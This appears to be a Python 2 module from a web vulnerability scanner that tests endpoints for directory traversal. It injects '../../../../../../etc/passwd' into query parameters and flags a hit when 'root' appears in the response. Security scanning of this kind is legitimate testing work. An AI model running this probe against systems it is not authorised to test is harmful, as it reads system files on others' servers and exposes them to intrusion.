from AttackModule import AttackModule
from Helpers import Helper
import requests

class DirTravAttackModule(AttackModule):
	
	def __init__(self):
		AttackModule.__init__(self, "Directory Traversal", "Directory Traversal")


	def attack(self, endpoint):
		self.attack_succeeded = False
		self.attack_report = None
		if True not in (endpoint.is_form(), endpoint.has_query_string()):
			print "Target is not a form or has a query string. Skipping."
			return

		print "Beginning attack -> Directory Traversal Attack\nTarget: {0}".format(endpoint.url)
		attackCounter = 1
		attackPattern = "../../../../../../etc/passwd"
		result = self.launch_attack(endpoint, attackPattern)
		if result:
			self.attack_succeeded = True
			# print "[DirectoryTraversal: {}/{},{}] ->".format(attackCounter, totalAttacks, attackPattern)
			print result
		else:
			attackCounter += 1

		if self.attack_succeeded:
			print "Finished attack -> Vulnerable]\n"
		else:
			print "Finished attack -> Nothing found!\n"

	def launch_attack(self, endpoint, payload):
		headers = {}
		formData = {}
		if endpoint.has_query_string():
			formData = endpoint.get_query_string_dict()

		for key in formData.keys():
			formData[key] = payload
			res = None
			res = Helper.do_get_request(endpoint, headers, formData)

			if self.is_attack_successful(res):
				return True

		return False

	def is_attack_successful(self, res):
		if res.ok:
			if res.status_code == 200:
				if "root" in res.text:
					return True
			else:
				return False
		return False
		# =open('LfiPayload.txt','r')
		# for i in f.readlines():

		# 	ur = requests.get(url+'{}'.format(i))
		# 	if "root" in ur.content:
		# 		print 'Detected LFT'
		# 		time.sleep(2)